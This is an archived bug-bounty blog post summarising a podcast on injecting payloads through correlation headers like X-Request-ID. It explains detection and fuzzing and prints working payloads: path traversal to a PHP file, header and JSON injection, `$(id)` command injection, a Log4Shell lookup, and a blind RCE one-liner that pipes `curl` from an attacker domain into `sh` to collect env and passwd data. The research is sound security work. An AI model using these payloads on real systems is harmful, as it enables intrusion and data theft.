# hackernotes-ep86-xcorrelation

- **Source URL:** https://blog.criticalthinkingpodcast.io/p/hackernotes-ep86-xcorrelation-frans-rce-research-drop
- **Fetched:** 2026-11-11
- **Researcher:** fransrosen
- **Method:** curl + trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---

- [Critical Thinking - Bug Bounty Podcast](../)
- Posts
- \[HackerNotes Ep.86\] The X-Correlation between Frans & RCE - Research Drop

# \[HackerNotes Ep.86\] The X-Correlation between Frans & RCE - Research Drop

## Frans Rosen and Justin sit down to discuss and drop gold on X-correlation injection, with impacts and POCs ranging from JSON injection to RCE.

## **Hacker TLDR;**

- **X-Correlation Injection:** Correlation headers like `X-Request-ID` or `X-Correlation-ID` are more than just debugging tools. They can expand the attack surface of a target by potentially interacting with various contexts within the application, from CI pipelines to internal logging, making them prime targets for exploitation.
  - **Identifying potential targets**
    - Look at access-control-\* headers for any sign of an ID header.
    - Check all response headers from the app itself for any `-id` or `id` related headers.
    - Check for a reflection of the header value from your request in the response. If it reflects, it could be a high signal lead.
- **Fuzzing headers**
  - **Fuzz by trigger errors**: Fuzzing with a range of characters which will probably break a context if the header value is being used as input somewhere. Adding random ASCII characters for example `x-request-id: ' " % & > [ $` would cause problems in most contexts.
    1. With these fuzz characters added to the header, perform regular testing on the site and keep a lookout for weird app behaviours and errors.
  - **Fuzz blind:** With blind fuzzing, we need an out-of-band trigger to know if a payload successfully detonated or not. Some ideas for out-of-band-based triggers:
    - X-request-id: blind XSS
    - X-request-id: OOB/RCE /BLIND RCE
    - X-request-id: SQL Inj with DNS
    - X-request-id: log4shell
- **Sample payloads:**
  - **Header injection (secondary context style):**
`x-request-id: 1%0d%0ax-account:456`
  - **Java header injection:**
`x-request-id: 1%c4%8d%c4%8anew-header: f00`
  - **OS Command injection:**
`x-request-id: $(id)`
  - **Log4shell:**
`x-request-id: ${jdni:rmi://x${sys:java.version}.mydomain/a}`
  - **JSON Injection:**
`x-request-id: 1"}. "payload":{"account":"456","foo":"`
- **JSON Injection:** JSON injection can feel blind to begin with, but we’ve got a bunch of tips below on navigating JSON injection contexts, potential impacts and exploit scenarios.

*This episode is sponsored by ThreatLocker. Check out their eBook "The IT Professional's Blueprint for Compliance" here!*

## X-Correlation Injection

When Frans opens a presentation with the subheading ‘How to break server-side contexts’ you just know it’s going to be some crazy next-level stuff. You’ll probably be kicking yourself after this one.

You might have seen headers flying around such as `X-Request-ID` or `X-Correlation-ID` and so on when playing around in Burp or Caido. The purpose of these headers is to be able to follow the trace of the request throughout the ecosystem of the application for debugging purposes: Where did the request go, what failed, where did it go wrong, how did it route etc.

A lot of these headers and IDs interact with local file systems, get pushed into CI pipelines and end up in internal logging and monitoring apps. Can you see where this is heading?

Equally, there’s no standard for the format of these. You can have any kind of ID header - `x-trace-id`, `request-id`, `x-corellation-id`, etc. Frans dropped a few tips from his research to identify these, but once you have a feel for the target or app, you’ll probably be able to spot them quite quickly.

**Identifying the headers**

One way to find if these are supported is via the `access-control-*` headers or from the response headers from the app itself. Equally, searching through your proxy project file for any sort of `-id` header might provide some solid leads. Take for example:

Reflection is also a good indicator. If you can put any type of input in the header `service-transaction-id` for example and it’s reflected within the response header it can be quite a high signal lead, ie:

**TL;DR:** 

- Look at access-control-\* headers for any sign of an ID header.
- Check all response headers from the app itself for any `-id` or `id` related headers.
- If you find one of these headers, add it to your request and if the header value is reflected in the header on the response, you might be onto something.

### **Fuzzing the headers**

When fuzzing the headers from this perspective there are a lot of unknowns - we don’t know the context (or contexts) we are in, we don’t know if or where this input is ending up and we don’t even know if it’s actually vulnerable. With this type of complete black-box fuzzing, we need to be smart to gain more knowledge of the context. A few ways to do this:

1. **Fuzz by trigger errors**: Fuzzing with a range of characters which will probably break a context if the header value is being used as input somewhere. Adding all ascii characters for example `x-request-id: ' " % & > [ $` would cause problems in most contexts.
  1. With these fuzz characters added to the header, perform regular testing on the site.
  2. Keep an eye on application responses and behaviours. During this research, for example, Frans saw a lot of 500s when hitting certain endpoints.
2.  **Fuzz blind:** With blind fuzzing, we need an out-of-band trigger to know if a payload successfully detonated or not. Some ideas for out-of-band-based triggers:
  - X-request-id: blind XSS
  - X-request-id: OOB/RCE /BLIND RCE
  - X-request-id: SQL Inj with DNS
  - X-request-id: log4shell
  - X-request-id: ???

**False positives**

When performing these styles of fuzzing, you may hit a few false positives. This is to be expected when you have no idea what context you’ll be in, but a few common ones include:

- Some `Request-ID` may be validated by a pattern, for example `^[a-f0-9-]{36}$` . Anything outside of the regex will cause an error.
- `Request-ID` isn’t allowed at all on specific endpoints and will cause an error

Be sure to rule this out and play around with the `Request-ID` headers to avoid any potential rabbit holes - is the ID actually allowed? is the header value matched against any kind of regex or format? etc.

Ok, so let’s summarise. We’ve got a header which is directly supplied and modifiable by the user and can be used in numerous contexts in the applications/targets ecosystem - ranging from error logging, CI pipelines and being passed through various proxies and backend services.

Let’s look at some of the findings Frans identified from this.

### **Findings so far**

**Path traverse/arbitrary file write**

- `X-REQUEST-ID: 12-456-791` would dump metrics to the local file system as `/tmp/trace-data/12-456-791`
  - Weaponizing this to: `x-request-id: ../../../../var/www/html/<?=phpinfo()?>.php`

**Header injection**

- `x-request-id: 1%0d%0ax-account:456` would inject a header on the backend API, which can be abused to hit the backend service with an arbitrary account ID. Very much secondary context-style hacking.

**Header injection with Java - \u010d → \u000d**

- `x-request-id: 1%c4%8d%c4%8anew-header: f00` Java will sometimes convert the characters in this context to a newline, resulting in a new header being added to the response.
- This was identified due to a tweet from Soroush Dalili in 2020. This is a good resource for this conversion: [https://r12a.github.io/app-conversion/](https://r12a.github.io/app-conversion/?utm_source=blog.criticalthinkingpodcast.io&utm_medium=referral&utm_campaign=hackernotes-ep-86-the-x-correlation-between-frans-rce-research-drop)

**OS Command injection**

- `x-request-id: $(id)` Plain and simple command injection. As mentioned in the research, this input can be placed in multiple different contexts - sometimes it can just be passed straight into a terminal.

**Log4shell**

- `x-request-id: ${jdni:rmi://x${sys:java.version}.mydomain/a}` Surprisingly, log4shell was still kicking around internally on Frans’s targets and worked!

**JSON Injection** 

- `x-request-id: 1"}. "payload":{"account":"456","foo":"` Depending on the context, this request ID may also be part of a bigger JSON blob being passed around to internal services. This allows more secondary context-style attacks. More on this shortly

**Optimizing OOB/BLIND RCE**

When it comes to payload choice and optimizing this kind of fuzzing, there are a few things to consider. The payload needs to support multiple contexts, meaning we need as few special characters as possible to avoid breaking contexts in which we may or may not be placed.

Equally, for a blind-based payload (similar to blind XSS), we would want to:

- Collect data when triggered
- Bypass WAFs - `${IFS}` blocked but `$IFS` not for adding spaces to command line-based inputs
- Need to avoid using spaces to due various the various contexts the payload will likely pass through
- A way of generating unique payloads so you can track when and where it was executed (kind of like your own `request-id`, ha)
- Some form of collection script to collect data from the host. Ie, if the user agent is curl a basic bash-based collection script to grab things like `whoami`, `uname`, `id`, `env` `passwd` output.
- Alerting when it happens - Frans made an email alert but something like a Discord or Slack webhook could also work.

One of the payloads used to accomplish this, combined with a bash script to pull some of the data mentioned above, was:

``'`curl$IFS@mydomain|sh`'$(curl$IFS@mydomain|sh)``
## Server-side JSON-Injection

Now, JSON injection can feel a bit blind, to begin with, but you need to figure out where you are in the context of your input. One good way to do this is to test for the difference between `"` and `\"` to understand the context you are in.

Frans showed a snippet of his JSON injection list on the pod, and it looked something like this:

Again, the aim of these kinds of wordlists is to understand the context you are in. There are multiple iterations here with all kinds of nested JSON - depending on your output and errors, you’ll be able to get a better idea of where you are. More on this shortly.

Some questions you should be considering when thinking of the context you’re in include:

- Are properties allowed? Are they not allowed?
- What is the difference between nested objects (as shown above)
- Are errors triggered with either input `“` and `\”` ?
- Are duplicate properties disallowed?
- Do multiple injection points exist?
- Are premature endings allowed?

**Premature ending**

```
id: 1"}x}} -> Error
id: 1"}}x} -> Error
id: 1"}}}x -> OK
```
**Duplicate properties and multiple injection points**

```
payload 1: 1", "foo":{"foo":"
payload 2: "}, "id": "4567
//Might look like
{
 "req-id":"1","foo":{"foo":"",
 "id":"1234",
 "trace":""}, "id":"4567"
}
```
When going this deep on a target and identifying properties, JSON injection contexts, creating a context-aware wordlist based on: API docs, prior traffic, wayback and maintaining things like casing of the parameter names will pay dividends.

If you have multiple injection points, you might be able to shuffle the properties depending on where you are. You might be able to go one level down, then come back to the level you were.

Some pretty cool ideas and examples. Some other places Frans identified JSON injection:

**S3 Bucket Injection**

- Able to inject and upload your own S3 conditions providing a `Conditions` statement which is allowed but ignored, meaning you can push the existing S3 upload policy into the `Conditions` statement which gets ignored.

**JWT**

- If you are able to get JSON injection inside a JWT, you can inject additional usernames/properties inside of a JWT such as scope, user, etc which could have a wide-ranging impact.

**Takeaways:**

- Correlation headers expand the attack surface - think of them as a source which may end up in many different contexts.
- Fuzz using error-based and blind context payloads.
- JSON injection is more common than expected. I think it’s been slept on but we’ll start seeing some cool research now.
- End payloads with `“` `\””` or `\` to detect context breaks.

Suuuper cool episode this week.

As always, keep hacking!
